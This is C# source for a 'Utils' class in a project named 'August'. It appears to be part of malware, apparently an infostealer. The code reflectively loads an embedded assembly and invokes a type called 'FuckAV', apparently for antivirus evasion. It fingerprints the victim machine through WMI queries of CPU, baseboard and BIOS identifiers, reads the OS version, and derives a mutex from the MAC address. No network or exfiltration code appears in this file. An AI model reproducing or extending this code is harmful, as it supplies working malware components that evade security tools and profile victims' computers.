using System;
using System.Security.Cryptography;
using System.Text;
using System.Runtime.InteropServices;
using System.Management;
using System.Diagnostics;
using System.Reflection;

namespace August
{
    class Utils
    {
        private static Assembly AugLib = Assembly.Load(Properties.Resources.AugLib);

        public static object FuckAV(string Method, object[] params_)
        {
            foreach (Type Types in AugLib.GetExportedTypes())
            {
                if (Types.Name == "FuckAV")
                {
                    object Instance = Activator.CreateInstance(Types);
                    object Result = Types.InvokeMember(Method, BindingFlags.InvokeMethod, null, Instance, params_);
                    return Result;
                }
            }
            return null;
        }

        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsWow64Process([In] IntPtr hProcess, [Out] out bool wow64Process);

        private static string FingerPrint = String.Empty;
        private static bool is64BitProcess = (IntPtr.Size == 8);
        public static bool is64BitOperatingSystem = is64BitProcess || InternalCheckIsWow64();
        private static readonly Random KRand = new Random();
        private static readonly object KSync = new object();

        public static int GetRandomNumber(int Min, int Max)
        {
            lock (KSync)
            {
                return KRand.Next(Min, Max);
            }
        }
        private static bool InternalCheckIsWow64()
        {
            if ((Environment.OSVersion.Version.Major == 5 && Environment.OSVersion.Version.Minor >= 1) ||
                Environment.OSVersion.Version.Major >= 6)
            {
                using (Process p = Process.GetCurrentProcess())
                {
                    bool retVal;
                    if (!IsWow64Process(p.Handle, out retVal))
                    {
                        return false;
                    }
                    return retVal;
                }
            }
            else
            {
                return false;
            }
        }
        public static string GetRandomString(int Size)
        {
            string Result = String.Empty;
            string Alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            for (int i = 0; i < Size; i++)
                Result += Alphabet[GetRandomNumber(0, Alphabet.Length)];
            return Result;
        }
        public static string GetOsName()
        {
            string OsName = "Unknown";
            using (ManagementObjectSearcher win32OperatingSystem = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem"))
            {
                foreach (ManagementObject obj in win32OperatingSystem.Get())
                {
                    OsName = obj["Caption"].ToString();
                    break;
                }
            }
            return OsName + " x" + (is64BitOperatingSystem ? "64" : "32");
        }
        public static string GetHwid()
        {
            if (String.IsNullOrEmpty(FingerPrint))
            {
                FingerPrint = Utils.GetHash("AUG -% 0: CPU[" + GetCpuId() + "] BASE[" + GetBaseId() + "] BIOS[" + GetBiosId() + "]");
                for (int i = 0; i < FingerPrint.Length; i++)
                    if (i % 5 == 4)
                        FingerPrint = FingerPrint.Insert(i, "-");
            }
            return FingerPrint;
        }
        private static string GetCpuId()
        {
            string Result = GetIdentifier("Win32_Processor", "UniqueId");
            if (!String.IsNullOrEmpty(Result)) return Result;
            Result = GetIdentifier("Win32_Processor", "ProcessorId");
            if (!String.IsNullOrEmpty(Result)) return Result;
            Result = GetIdentifier("Win32_Processor", "Name");
            if (String.IsNullOrEmpty(Result))
                Result = GetIdentifier("Win32_Processor", "Manufacturer");
            Result += GetIdentifier("Win32_Processor", "MaxClockSpeed");
            return Result;
        }
        private static string GetIdentifier(string WmiClass, string WmiProperty, string wmiMustBeTrue)
        {
            string Result = String.Empty;
            try
            {
                foreach (ManagementBaseObject Instance in new ManagementClass(WmiClass).GetInstances())
                {
                    if (!String.IsNullOrEmpty(Result) || Instance[wmiMustBeTrue].ToString() != "True") continue;
                    try
                    {
                        Result = Instance[WmiProperty].ToString();
                        break;
                    }
                    catch { }
                }
            }
            catch { }
            return Result;
        }
        private static string GetIdentifier(string WmiClass, string WmiProperty)
        {
            string Result = String.Empty;
            try
            {
                foreach (ManagementBaseObject Instance in new ManagementClass(WmiClass).GetInstances())
                {
                    if (!String.IsNullOrEmpty(Result)) continue;
                    try
                    {
                        Result = Instance[WmiProperty].ToString();
                        break;
                    }
                    catch { }
                }
            }
            catch { }
            return Result;
        }
        private static string GetHash(string s)
        {
            MD5 sec = new MD5CryptoServiceProvider();
            byte[] bt = Encoding.ASCII.GetBytes(s);
            return BitConverter.ToString(sec.ComputeHash(bt)).Replace("-", String.Empty);
        }
        private static string GenerateMutex()
        {
            return GetHash("AUG -% MUTEX: " + GetIdentifier("Win32_NetworkAdapter", "MACAddress"));
        }
        private static string GetBaseId()
        {
            return GetIdentifier("Win32_BaseBoard", "Model") + GetIdentifier("Win32_BaseBoard", "Manufacturer") + GetIdentifier("Win32_BaseBoard", "Name") + GetIdentifier("Win32_BaseBoard", "SerialNumber");
        }
        private static string GetBiosId()
        {
            return GetIdentifier("Win32_BIOS", "Manufacturer") + GetIdentifier("Win32_BIOS", "SMBIOSBIOSVersion") + GetIdentifier("Win32_BIOS", "IdentificationCode") + GetIdentifier("Win32_BIOS", "SerialNumber") + GetIdentifier("Win32_BIOS", "ReleaseDate") + GetIdentifier("Win32_BIOS", "Version");
        }
    }
}
